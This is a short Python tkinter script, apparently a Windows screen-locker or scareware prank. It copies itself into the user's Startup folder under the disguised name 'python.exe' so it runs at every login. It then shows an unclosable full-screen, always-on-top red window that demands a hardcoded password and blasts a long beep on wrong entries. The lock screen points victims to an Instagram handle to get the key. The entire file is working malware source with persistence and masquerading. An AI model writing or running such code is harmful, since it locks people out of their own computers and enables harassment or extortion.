import tkinter as tk
from tkinter import messagebox
import winsound
import os
import sys 
import shutil


path_app = os.path.abspath(sys.argv[0])
run_start = os.path.join(os.getenv("APPDATA") , "Microsoft" , "Windows" , "Start Menu" , "Programs" , "Startup")
name = os.path.join(run_start , "python.exe")

if not os.path.exists(name):
    shutil.copy(path_app , name)


root = tk.Tk()

def exit_app():
    root.destroy()

def clos():
    key = "johan"
    if entry.get() == key:
        exit_app()
    else:
        winsound.Beep(1000 , 7000)
        messagebox.showerror("fake you كلمة المفتاح غلط " , " تواصل مع حساب الشخص عبر انستغرام أسفل الشاشة")
    

root.overrideredirect(True)
root.attributes("-topmost", True)



# width code python 
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")

# stiyle code vs 
tk.Label(root, text="Enter password", bg="red", fg="white").pack()

entry = tk.Entry(root, width=50, bd=0)
entry.pack(pady=20)

b = tk.Button(root, text="Open" , command=clos)
b.pack()

root.config(background="red")


tk.Label(root , text=" Instagram: @sweepkii_j" , bg="red" , fg="White").place(x=root.winfo_screenwidth() // 2 - 50, y=600)


root.resizable(False , False)


root.mainloop()

